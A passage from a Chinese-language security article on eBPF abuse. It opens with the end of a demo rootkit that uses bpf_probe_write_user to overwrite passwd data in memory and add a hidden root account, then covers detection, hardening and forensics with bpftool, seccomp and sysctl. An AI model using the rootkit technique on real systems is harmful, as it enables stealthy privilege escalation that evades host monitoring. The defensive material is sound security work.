</span></span><span style="display:flex;"><span>                <span style="color:#719e07">else</span> {
</span></span><span style="display:flex;"><span>                    local_buff[i] <span style="color:#719e07">=</span> payload_passwd[i];
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#719e07">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">case</span> FILE_TYPE_SHADOW:
</span></span><span style="display:flex;"><span>        <span style="color:#586e75">// 覆盖 shadow文件
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>        ...
</span></span><span style="display:flex;"><span>        <span style="color:#719e07">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">case</span> FILE_TYPE_SUDOERS:
</span></span><span style="display:flex;"><span>        <span style="color:#586e75">//覆盖sudoers
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>        ...
</span></span><span style="display:flex;"><span>        <span style="color:#719e07">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">default</span><span style="color:#719e07">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#719e07">return</span> <span style="color:#2aa198">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#719e07">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#586e75">// 将payload内存写入到buffer
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>    ret <span style="color:#719e07">=</span> bpf_probe_write_user((<span style="color:#dc322f">void</span><span style="color:#719e07">*</span>)buff_addr, local_buff, MAX_PAYLOAD_LEN);
</span></span><span style="display:flex;"><span>    <span style="color:#586e75">// 发送事件到用户态
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>   
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">return</span> <span style="color:#2aa198">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>按照如上Demo rootkit的设计，即完成了随机用户名密码的root账号添加。在鉴权认证上，也可以配合“eBPF网络层恶意利用”的Demo，利用eBPF map交互，实现相应鉴权。但rootkit本身并没有更改硬盘上文件，不产生风险行为。并且，只针对特定进程的做覆盖，隐蔽性更好。整个流程如下图所示：</p>
<p><img src="https://image.cnxct.com/2022/02/ebpf-evil-user-runtime-1-1.jpg" alt="eBPF在runtime安全场景恶意利用"></p>
<p>不管是在物理机上，还是给了root+BPF权限的容器上，都一样生效。</p>
<h4 id="视频演示-1">视频演示</h4>
<h4 id="严重危害">严重危害</h4>
<p>云原生场景下，赋予SYS_ADMIN权限的容器场景很多，若配合近期的“Java log4j”漏洞，直接击穿容器，拿到宿主机权限，是不是很可怕？</p>
<p>然而，比这可怕的是：<strong>这种rootkit本身并没有产生用户态行为日志，也没有改文件，系统里查不到这个用户信息。整个后门行为不产生数据，让大部分HIDS失灵</strong>。</p>
<h3 id="综述">综述</h3>
<p>从本文演示的这两个场景可以来看，相信大家已经知道了eBPF技术被恶意利用的危害性。其实，这只是eBPF技术被恶意利益的“冰山一角”，在kproeb\uprobe上也有很多功能，比如实现进程隐藏、无痕内网扫描等等。更多相关的恶意利用，大家可参考<a href="https://blog.tofile.dev/2021/08/01/bad-bpf.html">Bad BPF - Warping reality using eBPF</a>一文。</p>
<p>若入侵者精心设计rootkit，实现进程隐藏等，让rootkit更加隐蔽，按照本文的思路，实现一个“幽灵般”的后门，想想就让人后怕。</p>
<p>常规的主机安全防御产品一般用Netlink、Linux Kernel Module等技术实现进程创建、网络通信等行为感知，而eBPF的hook点可以比这些技术更加深，比它们执行更早，意味着常规HIDS并不能感知发现它们。</p>
<p>传统rootkit，采用hook api的方法，替换原来函数，导致执行函数调用地址发生变化，已有成熟检测机制，eBPF hook不同于传统rootkit，函数调用堆栈不变。这给检测带来很大的麻烦。</p>
<p>那面对这种后门，我们该如何检测防御呢？</p>
<h2 id="检测防御">检测防御</h2>
<p>从事件发生的过程来看，分为三个阶段：</p>
<ul>
<li>运行前</li>
<li>运行时</li>
<li>运行后</li>
</ul>
<p><img src="https://p0.meituan.net/travelcube/fbb0e4ee1009e156a873a2f9e1d276a0550164.png" alt=""></p>
<h3 id="运行前">运行前</h3>
<p>在恶意程序运行前，减少攻击面，这个思路是不变的。</p>
<h4 id="环境限制">环境限制</h4>
<p>不管是宿主机还是容器，都进行权限收敛，能不赋予SYS_ADMIN、CAP_BPF等权限，就禁止掉。若一定要开放这个权限，那么只能放到运行时的检测环节了。</p>
<h4 id="seccomp限制">seccomp限制</h4>
<p>在容器启动时，修改默认seccomp.json，禁止bpf系统调用，防止容器逃逸，注意此方法对于Privileged特权容器无效。</p>
<h4 id="内核编译参数限制">内核编译参数限制</h4>
<p>修改函数返回值做运行时防护时，需要用到bpf_override_return，该函数需要内核开启CONFIG_BPF_KPROBE_OVERRIDE编译参数，因此非特殊情况不要开启该编译参数。</p>
<h4 id="非特权用户指令">非特权用户指令</h4>
<p>大部分eBPF程序类型都需要root权限的用户才能调用执行。但有几个例外，比如BPF_PROG_TYPE_SOCKET_FILTER和BPF_PROG_TYPE_CGROUP_SKB这两个类型，就不需要root。但需要读取系统配置开关。</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#586e75">//https://elixir.bootlin.com/linux/v5.16.9/source/kernel/bpf/syscall.c#L2240
</span></span></span><span style="display:flex;"><span><span style="color:#586e75"></span>
</span></span><span style="display:flex;"><span><span style="color:#719e07">if</span> (type <span style="color:#719e07">!=</span> BPF_PROG_TYPE_SOCKET_FILTER <span style="color:#719e07">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	    type <span style="color:#719e07">!=</span> BPF_PROG_TYPE_CGROUP_SKB <span style="color:#719e07">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#719e07">!</span>bpf_capable())
</span></span><span style="display:flex;"><span>		<span style="color:#719e07">return</span> <span style="color:#719e07">-</span>EPERM;
</span></span></code></pre></div><p><strong>开关确认</strong></p>
<p>在/proc/sys/kernel/unprivileged_bpf_disabled里，可通过执行<code>sysctl kernel.unprivileged_bpf_disabled=1</code>来修改配置。配置含义见<a href="https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html#unprivileged-bpf-disabled">Documentation for /proc/sys/kernel/</a>。</p>
<ul>
<li>值为0表示允许非特权用户调用bpf；</li>
<li>值为1表示禁止非特权用户调用bpf且该值不可再修改，只能重启后修改；</li>
<li>值为2表示禁止非特权用户调用bpf，可以再次修改为0或1。</li>
</ul>
<h4 id="特征检查">特征检查</h4>
<p>有人提议，在内核加载BPF字节码时，进行签名验证，以便达到只加载安全签名的BPF字节码。在lwn.net中也列出这个话题：<a href="https://lwn.net/Articles/853489/">BPF字节码签名计划</a>。</p>
<p>但很多人也提出<a href="https://lwn.net/Articles/854386/">反对意见</a>，他们认为BPF模块这几年的发展，过于抽象化，越来越复杂，所以不希望加入额外的功能，让BPF更加不稳定。而是改变思路，让字节码加载时签名，改为“执行BPF字节码加载的用户态程序进行签名”，这个是已有的内核功能，不会增加系统复杂性。</p>
<p>本文认为，这确实可以缓解大部分BPF字节码加载的问题。但使用系统原生命令（<code>tc\ip\bpftool</code>等）加载的话，仍面临威胁。比如：<code>ip link set dev ens33 xdp obj xdp-example_pass.o</code>。</p>
<p><img src="https://image.cnxct.com/2022/02/ip-xdp-ebpf-load.jpg" alt="ip命令加载eBPF字节码"></p>
<h4 id="运行检查">运行检查</h4>
<p>大部分eBPF程序在重启后不存在了，所以入侵者会尽可能让后门自启动。对于Linux系统的自启动、crontab等计划任务做好检查。</p>
<p>用户态程序可以以各种形式存在，ELF可执行文件、ELF so动态链接库都可以。在执行时，必定会调用BPF syscall来加载BPF字节码。若只是对可执行ELF做检测，还不够准确。</p>
<h3 id="运行时">运行时</h3>
<h4 id="监控">监控</h4>
<p>Linux系统中，所有的程序运行，都必须进行系统调用，eBPF程序也不例外。需要调用syscall为321的SYS_BPF指令。并且，所有的eBPF程序执行、map创建都必须进行这个syscall调用。那么，在这个必经之路进行拦截监控，是最好的方案。</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SEC(<span style="color:#2aa198">&#34;tracepoint/syscalls/sys_enter_bpf&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#dc322f">int</span> tracepoint_sys_enter_bpf(<span style="color:#719e07">struct</span> syscall_bpf_args <span style="color:#719e07">*</span>args) {
</span></span><span style="display:flex;"><span>	<span style="color:#719e07">struct</span> bpf_context_t <span style="color:#719e07">*</span>bpf_context <span style="color:#719e07">=</span> make_event();
</span></span><span style="display:flex;"><span>	<span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>bpf_context)
</span></span><span style="display:flex;"><span>		<span style="color:#719e07">return</span> <span style="color:#2aa198">0</span>;
</span></span><span style="display:flex;"><span>	bpf_context<span style="color:#719e07">-&gt;</span>cmd <span style="color:#719e07">=</span> args<span style="color:#719e07">-&gt;</span>cmd;
</span></span><span style="display:flex;"><span>	get_common_proc(<span style="color:#719e07">&amp;</span>bpf_context<span style="color:#719e07">-&gt;</span>procinfo);
</span></span><span style="display:flex;"><span>	send_event(args, bpf_context);
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">return</span> <span style="color:#2aa198">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这里，我们开源的ehids项目做了一个BPF syscall检测的例子，大家可以Fork了解。仓库地址为：<a href="https://github.com/ehids/ehids-agent/blob/master/kern/bpf_call_kern.c">GitHub/ehids</a>。</p>
<p>细心的读者这时可能会有疑问，假如入侵者的后门执行比较早，对这个系统调用进行欺骗，那怎么办呢？这是一个非常好的问题，我们将放到运行后的溯源章节进行讨论。但对于大部分场景，HIDS防御产品还是可以做到第一时间启动的。</p>
<h4 id="审计筛查">审计&amp;筛查</h4>
<p>上面我们讨论了对BPF系统的调用进行监控。而在云原生场景中，基于eBPF实现的网络产品会频繁调用，会产生大量的事件日志，从而给运营同学带来较大的压力。那么，对行为做精简、做精确筛选，就成为我们接下来的目标。</p>
<p><strong>根据程序白名单筛选</strong></p>
<p>数据过滤，是解决大量数据压力的一种方案。在一些BPF应用的业务服务器上，本身业务行为会产生大量调用，会给安全预警带来较大审计压力。对于已知的进程，我们可以根据进程特征过滤。</p>
<p>获取当前进程pid、comm等属性，根据用户态写入eBPF map的配置，决定是否上报、是否拦截。 也可以在用户态做过滤，但内核态效率更高。如果是做拦截，那必须要在内核态实现。</p>
<p>大家可以参考<a href="https://github.com/ehids/slide/blob/master/security/2021-Secure_Namespaced_Kernel_Audit_for_Containers.pdf">saBPF产品设计思路</a> ，用eBPF实现LSM hook点的钩子程序，完成相关审计调用。虽然<a href="https://github.com/saBPF-project/sabpf-kernel">GitHub/saBPF-project</a> 的项目代码还只是Demo，但思路可以借鉴。</p>
<p><img src="https://p0.meituan.net/travelcube/3f4ff33f8e187f8056d394d59af24145438951.png" alt=""></p>
<p><strong>根据SYSCALL类型筛选</strong></p>
<p>在BPF syscall里，子命令的功能包含map、prog等多种类型的操作，<a href="https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html">bpf() subcommand reference</a> 里有详细的读写API。在实际的业务场景里，“写”的安全风险比“读”大。所以，我们可以过滤掉“读”操作，只上报、审计“写”操作。</p>
<p>比如：</p>
<ul>
<li>MAP的创建BPF_MAP_CREATE</li>
<li>PROG加载BPF_PROG_LOAD</li>
<li>BPF_OBJ_PIN</li>
<li>BPF_PROG_ATTACH</li>
<li>BPF_BTF_LOAD</li>
<li>BPF_MAP_UPDATE_BATCH</li>
</ul>
<p>尤其是有BPF需求的业务场景，可以更好的审计日志。</p>
<h3 id="运行后">运行后</h3>
<p>这里提几个问题，eBPF用户态程序与内核态程序交互，加载BPF字节码后，能退出吗？退出后，内核hook的BPF函数还工作吗？创建的map是否还存在？后门程序为了保证更好的隐蔽性，我们当如何选择？</p>
<p>如果要回答这些问题，不得不提BPF程序的加载机制，BPF对象生命周期。</p>
<h4 id="文件描述符与引用计数器">文件描述符与引用计数器</h4>
<p>用户态程序通过文件描述符FD来访问BPF对象（progs、maps、调试信息），每个对象都有一个引用计数器。用户态打开、读取相应FD，对应计数器会增加。若FD关闭，引用计数器减少，当refcnt为0时，内核会释放BPF对象，那么这个BPF对象将不再工作。</p>
<p>在安全场景里，用户态的后门进程若退出后，后门的eBPF程序也随之退出。在做安全检查时，这可以作为一个有利特征，查看进程列表中是否包含可疑进程。</p>
<p>但并非所有BPF对象都会随着用户态进程退出而退出。从内核原理来看，只需要保证refcnt大于0，就可以让BPF对象存活，让后门进程持续工作了。其实在BPF的程序类型中，像XDP、TC和基于CGROUP的钩子是全局的，不会因为用户态程序退出而退出。相应FD会由内核维护，保证refcnt计数器不为零，从而继续工作。</p>
<h4 id="溯源">溯源</h4>
<p>安全工程师经常需要根据不同场景作不同的溯源策略。本文给的溯源方式中，都使用了eBPF的相关接口，这意味着：<strong>如果恶意程序比检查工具运行的早，那么对于结果存在伪造的可能</strong>。</p>
<p><strong>短生命周期</strong></p>
<p><strong>BPF程序类型代表</strong></p>
<ul>
<li>k[ret]probe</li>
<li>u[ret]probe</li>
<li>tracepoint</li>
<li>raw_tracepoint</li>
<li>perf_event</li>
<li>socket filters</li>
<li>so_reuseport</li>
</ul>
<p>特点是基于FD管理，内核自动清理，对系统稳定性更好。这种程序类型的后门，在排查时特征明显，就是用户态进程。并且可以通过系统正在运行的BPF程序列表中获取。</p>
<p><strong>bpftool工具</strong></p>
<p><strong>eBPF程序列表</strong></p>
<p>命令<code>bpftool prog show</code>，以及<code>bpftool prog help</code>查看更多参数。</p>
<p><img src="https://image.cnxct.com/2022/02/bpftool-prog-show-1.jpg" alt=""></p>
<p>结果中，可以看到当前系统正在运行的BPF程序、关联的BPF map ID，以及对应的进程信息等。另外，细心的读者可能发现，结果中，XDP数据中并没有进程ID信息，稍后讨论。</p>
<p><strong>eBPF map列表</strong></p>
<p>命令<code>bpftool map show</code>，以及<code>bpftool map help</code>可以查看更多参数。</p>
<p><img src="https://image.cnxct.com/2022/02/bpftool-map-show-1.jpg" alt=""></p>
<p>通过查看map信息，可以与程序信息作辅助矫正。并且，可以导出map内数据用来识别恶意进程行为。这部分我们在“取证”章节讨论。</p>
<p><strong>bpflist-bpfcc</strong></p>
<p><code>bpflist-bpfcc -vv</code>命令可以看到当前服务器运行的“部分”BPF程序列表。以测试环境为例：</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@vmubuntu:/home/cfc4n/project/xdp## bpflist-bpfcc  -vv
</span></span><span style="display:flex;"><span>open kprobes:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>open uprobes:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PID    COMM             TYPE  COUNT
</span></span><span style="display:flex;"><span><span style="color:#2aa198">1</span>      systemd          prog  <span style="color:#2aa198">8</span>
</span></span><span style="display:flex;"><span><span style="color:#2aa198">10444</span>  ehids            map   <span style="color:#2aa198">4</span>
</span></span><span style="display:flex;"><span><span style="color:#2aa198">10444</span>  ehids            prog  <span style="color:#2aa198">5</span>
</span></span></code></pre></div><p>可以看到系统进程systemd启动了8个prog程序。ehids进程创建了4个eBPF map与5个prog。但实际上前面也执行了<code>ip link set dev ens33 xdp obj xdp-example_pass.o</code>命令，在这里却没有显示出来。意味着这个命令输出的结果并不是所有bpf程序、map的情况。</p>
<p><img src="https://image.cnxct.com/2022/02/bpflist-bpfcc.jpg" alt=""></p>
<p><strong>长生命周期</strong></p>
<p><strong>BPF程序类型代表</strong></p>
<ul>
<li>XDP</li>
<li>TC</li>
<li>LWT</li>
<li>CGROUP</li>
</ul>
<p>上面提到以ip命令加载BPF字节码的场景，常见BPF工具查询不到或信息缺失。这背后原因，需要从它的工作原理讲起。</p>
<p><strong>ip命令加载BPF原理</strong></p>
<p>BPF对象的生命周期使用引用计时器管理，这一大原则是所有BPF对象都需要遵守的。而长生命周期的程序类型起FD是用户控件程序传递参数给内核空间，之后再由内核空间维持。</p>
<p>以前面提到的IP命令<code>ip link set dev ens33 xdp obj xdp-example_pass.o</code>为例。ip命令的参数中包含bpf字节码文件名，ip进程打开.o字节码的FD，通过NETLINK发IFLA_XDP类型消息（子类型IFLA_XDP_FD）给内核，内核调用dev_change_xdp_fd函数，由网卡接管FD，引用计数器递增，用户空间的ip进程退出后，BPF程序依旧工作。内核源码参见：<a href="https://elixir.bootlin.com/linux/v5.16.10/source/tools/lib/bpf/netlink.c#L237">elixir.bootlin.com/linux</a>。</p>
<p>本文做了抓包验证，ip程序关联XDP程序类型：</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>17:53:22.553708 sendmsg<span style="color:#719e07">(</span>3, 
</span></span><span style="display:flex;"><span>	<span style="color:#719e07">{</span>
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">msg_name</span><span style="color:#719e07">={</span><span style="color:#268bd2">sa_family</span><span style="color:#719e07">=</span>AF_NETLINK, <span style="color:#268bd2">nl_pid</span><span style="color:#719e07">=</span>0, <span style="color:#268bd2">nl_groups</span><span style="color:#719e07">=</span>00000000<span style="color:#719e07">}</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">msg_namelen</span><span style="color:#719e07">=</span>12, 
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">msg_iov</span><span style="color:#719e07">=[</span>
</span></span><span style="display:flex;"><span>		<span style="color:#719e07">{</span>
</span></span><span style="display:flex;"><span>			<span style="color:#268bd2">iov_base</span><span style="color:#719e07">={</span>
</span></span><span style="display:flex;"><span>				<span style="color:#719e07">{</span><span style="color:#268bd2">nlmsg_len</span><span style="color:#719e07">=</span>52, <span style="color:#268bd2">nlmsg_type</span><span style="color:#719e07">=</span>RTM_NEWLINK, <span style="color:#268bd2">nlmsg_flags</span><span style="color:#719e07">=</span>NLM_F_REQUEST|NLM_F_ACK, <span style="color:#268bd2">nlmsg_seq</span><span style="color:#719e07">=</span>1642672403, <span style="color:#268bd2">nlmsg_pid</span><span style="color:#719e07">=</span>0<span style="color:#719e07">}</span>, 
</span></span><span style="display:flex;"><span>				<span style="color:#719e07">{</span><span style="color:#268bd2">ifi_family</span><span style="color:#719e07">=</span>AF_UNSPEC, <span style="color:#268bd2">ifi_type</span><span style="color:#719e07">=</span>ARPHRD_NETROM, <span style="color:#268bd2">ifi_index</span><span style="color:#719e07">=</span>if_nametoindex<span style="color:#719e07">(</span><span style="color:#2aa198">&#34;ens33&#34;</span><span style="color:#719e07">)</span>, <span style="color:#268bd2">ifi_flags</span><span style="color:#719e07">=</span>0, <span style="color:#268bd2">ifi_change</span><span style="color:#719e07">=</span>0<span style="color:#719e07">}</span>, 
</span></span><span style="display:flex;"><span>				<span style="color:#719e07">{</span>
</span></span><span style="display:flex;"><span>					<span style="color:#719e07">{</span><span style="color:#268bd2">nla_len</span><span style="color:#719e07">=</span>20, <span style="color:#268bd2">nla_type</span><span style="color:#719e07">=</span>IFLA_XDP<span style="color:#719e07">}</span>, 
</span></span><span style="display:flex;"><span>					<span style="color:#719e07">[</span>
</span></span><span style="display:flex;"><span>						<span style="color:#719e07">{{</span><span style="color:#268bd2">nla_len</span><span style="color:#719e07">=</span>8, <span style="color:#268bd2">nla_type</span><span style="color:#719e07">=</span>IFLA_XDP_FD<span style="color:#719e07">}</span>, 6<span style="color:#719e07">}</span>, 
</span></span><span style="display:flex;"><span>						<span style="color:#719e07">{{</span><span style="color:#268bd2">nla_len</span><span style="color:#719e07">=</span>8, <span style="color:#268bd2">nla_type</span><span style="color:#719e07">=</span>IFLA_XDP_FLAGS<span style="color:#719e07">}</span>, XDP_FLAGS_UPDATE_IF_NOEXIST<span style="color:#719e07">}</span>
</span></span><span style="display:flex;"><span>					<span style="color:#719e07">]</span>
</span></span><span style="display:flex;"><span>				<span style="color:#719e07">}</span>
</span></span><span style="display:flex;"><span>			<span style="color:#719e07">}</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#268bd2">iov_len</span><span style="color:#719e07">=</span><span style="color:#2aa198">52</span>
</span></span><span style="display:flex;"><span>		<span style="color:#719e07">}</span>
</span></span><span style="display:flex;"><span>		<span style="color:#719e07">]</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">msg_iovlen</span><span style="color:#719e07">=</span>1, 
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">msg_controllen</span><span style="color:#719e07">=</span>0, 
</span></span><span style="display:flex;"><span>	<span style="color:#268bd2">msg_flags</span><span style="color:#719e07">=</span><span style="color:#2aa198">0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#719e07">}</span>, 0<span style="color:#719e07">)</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">52</span>
</span></span></code></pre></div><p>可以看到IFLA_XDP_FD后面的FD参数是6。同样，删除XDP程序，需要把FD设置为-1，对应NETLINK包构成如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>17:55:16.306843 sendmsg<span style="color:#719e07">(</span>3, 
</span></span><span style="display:flex;"><span>	<span style="color:#719e07">{</span>
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>					<span style="color:#719e07">{</span><span style="color:#268bd2">nla_len</span><span style="color:#719e07">=</span>20, <span style="color:#268bd2">nla_type</span><span style="color:#719e07">=</span>IFLA_XDP<span style="color:#719e07">}</span>, 
</span></span><span style="display:flex;"><span>					<span style="color:#719e07">[</span>
</span></span><span style="display:flex;"><span>						<span style="color:#719e07">{{</span><span style="color:#268bd2">nla_len</span><span style="color:#719e07">=</span>8, <span style="color:#268bd2">nla_type</span><span style="color:#719e07">=</span>IFLA_XDP_FD<span style="color:#719e07">}</span>, -1<span style="color:#719e07">}</span>, 
</span></span><span style="display:flex;"><span>						<span style="color:#719e07">{{</span><span style="color:#268bd2">nla_len</span><span style="color:#719e07">=</span>8, <span style="color:#268bd2">nla_type</span><span style="color:#719e07">=</span>IFLA_XDP_FLAGS<span style="color:#719e07">}</span>, XDP_FLAGS_UPDATE_IF_NOEXIST<span style="color:#719e07">}</span>
</span></span><span style="display:flex;"><span>					<span style="color:#719e07">]</span> <span style="color:#719e07">}</span>
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>	<span style="color:#719e07">}</span>, 0<span style="color:#719e07">)</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">52</span>
</span></span></code></pre></div><p>不止ip命令，<a href="https://man7.org/linux/man-pages/man8/tc-bpf.8.html">TC命令分类器</a> 也是支持BPF程序，将BPF程序作为classifiers和 act ions加载到ingress/egress hook点。背后原理与IP类似，也是NetLink协议与内核通信，网卡维持BPF对象计数器。</p>
<p><strong>检测机制</strong></p>
<p><strong>使用原生ip、tc等命令，查看网卡加载的BPF对象</strong></p>
<ol>
<li><code>ip link show</code></li>
<li><code>tc filter show dev [网卡名] [ingress|egress]</code></li>
</ol>
<p><img src="https://image.cnxct.com/2022/02/ip-tc-show-bpf.jpg" alt=""></p>
<p><strong>使用bpftool命令查看</strong></p>
<p><code>bpftool net show dev ens33 -p</code>命令可以用于查看网络相关的eBPF hook点。</p>
<p>CGROUP的的BPF_PROG_TYPE_CGROUP_SKB、BPF_PROG_TYPE_CGROUP_SOCK类型程序的加载情况都可以通过bpftool prog show查看。长短生命周期的BPF程序区别是缺少用户空间进程PID信息。如下图所示：</p>
<p><img src="https://image.cnxct.com/2022/02/bpftool-prog-show-cgroup.jpg" alt=""></p>
<p><strong>BPFFS</strong></p>
<p>除了前面提到的方法外，<strong>BPF文件系统</strong>BPFFS也是让BPF程序后台运行的方式。用户空间进程可以使用任意名字将BPF程序PIN到BPFFS。让在BPFFS来自动增加BPF对象的refcnt引用计数器，来保持后台的活跃状态。在使用时，只需要使用bpf_obj_get(“BPFFS path”)就可以获得BPF对象的FD。</p>
<p>BPFFS在Linux的类型是BPF_FS_MAGIC，默认目录/sys/fs/bpf/，可自定义修改，但确保文件系统类型是unix.BPF_FS_MAGIC。</p>
<p>在检测思路上，我们需要关注虚拟文件系统是不是unix.BPF_FS_MAGIC类型。</p>
<p>在Linux系统上，<code>mount -t bpf</code>来查看系统所有挂在的文件类型，是否包含BPFFS类型。</p>
<p><img src="https://image.cnxct.com/2022/02/mount-bpf-bpffs.jpg" alt=""></p>
<p>确定BPFFS的目录后，我们再查看目录下的挂载点是否存在异常。</p>
<h4 id="取证">取证</h4>
<p><strong>内核已加载的BPF对象导出</strong></p>
<p>bpftool工具可以导出有FD id的prog、map。</p>
<p><strong>BPF prog程序</strong></p>
<p>可以导出opcode\visual\linum等多种格式，并可以生成调用关系图。具体可以查看bpftool的帮助文件。</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@vmubuntu:/home/cfc4n# bpftool prog <span style="color:#b58900">help</span>
</span></span><span style="display:flex;"><span>bpftool prog dump xlated PROG <span style="color:#719e07">[{</span> file FILE | opcodes | visual | linum <span style="color:#719e07">}]</span>
</span></span><span style="display:flex;"><span>bpftool prog dump jited  PROG <span style="color:#719e07">[{</span> file FILE | opcodes | linum <span style="color:#719e07">}]</span>
</span></span></code></pre></div><p><strong>BPF map</strong></p>
<p>与prog类似，也可以通过bpftool导出内容，并支持JSON格式化内容。</p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@vmubuntu:/home/cfc4n# bpftool map dump id <span style="color:#2aa198">20</span>
</span></span><span style="display:flex;"><span><span style="color:#719e07">[{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#2aa198">&#34;value&#34;</span>: <span style="color:#719e07">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#2aa198">&#34;.rodata&#34;</span>: <span style="color:#719e07">[{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#2aa198">&#34;target_ppid&#34;</span>: <span style="color:#2aa198">0</span>
</span></span><span style="display:flex;"><span>                <span style="color:#719e07">}</span>,<span style="color:#719e07">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#2aa198">&#34;uid&#34;</span>: <span style="color:#2aa198">0</span>
</span></span><span style="display:flex;"><span>                <span style="color:#719e07">}</span>,<span style="color:#719e07">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#2aa198">&#34;payload_len&#34;</span>: <span style="color:#2aa198">38</span>
</span></span><span style="display:flex;"><span>    ...
</span></span></code></pre></div><p><img src="https://image.cnxct.com/2022/02/bpftool-map-dump-ehids.jpg" alt=""></p>
<p><strong>BPFFS</strong></p>
<p>BPFFS类型的BPF对象，虽然可以更便捷的放到后台执行，用户空间程序可以退出，也可以再次读取，但这也给取证带来很大便利。bpftool命令也支持从pinned到BPFFS文件系统的路径里导出prog、map。参数稍有区别，详情见bpftool help。</p>
<p><img src="https://image.cnxct.com/2022/02/bpftool-prog-dump-pinned.jpg" alt=""></p>
<p><strong>内核未加载的BPF对象</strong></p>
<p>当定位到后门rootkit的用户空间程序后，那么BPF字节码肯定会被其调用。字节码内容一般会放在一个独立文件中，或者作为字节码编译到当前程序里。这也只需要使用IDA之类反编译工具，定位到相关字节流，导出即可。</p>
<p>以本文演示视频中的ehids进程为例，使用<a href="https://github.com/ehids/ebpfmanager">GitHub/ehids/ebpfmanager</a> 纯Go的eBPF模块管理器package，对于eBPF字节码会使用github.com/shuLhan/go-bindata/cmd/go-bindata包对BPF字节码进行加载、Gzip压缩，作为Go代码的变量，在部署时比较边界。</p>
<p>IDA Pro加载时，我们可以在.noptrdata段部分看到这块代码，开始地址是0000000000827AE0，导出后再解压，可以还原原来的BPF ELF文件内容。</p>
<p><img src="https://image.cnxct.com/2022/02/ida-ehids-elf-bpf-bytecode-scaled.jpg" alt=""></p>
<p>因为每个BPF用户态实现不同，类库也不一样，静态分析实践起来有难度。那可以模拟相同环境，动态运行，提前hook BPF syscall，找到FD设置的地方，也是可以导出BPF的ELF文件。</p>
<p><strong>字节码分析</strong></p>
<p>BPF字节码本身也是ELF格式，只是格式指令上有一定区别。反编译工具IDA pro也能支持，国外安全工程师开源了一个Python插件：<a href="https://github.com/cylance/eBPF_processor">eBPF IDA Proc</a> ，并整理了一篇分析的文章：<a href="https://blogs.blackberry.com/en/2021/12/reverse-engineering-ebpfkit-rootkit-with-blackberrys-free-ida-processor-tool">Reverse Engineering Ebpfkit Rootkit With BlackBerry’s Enhanced IDA Processor Tool</a> ，感兴趣的同学可以读读。</p>
<p><img src="https://image.cnxct.com/2022/02/ida-pro-ebpf-elf-plugin.png" alt=""></p>
<h3 id="如何防御">如何防御</h3>
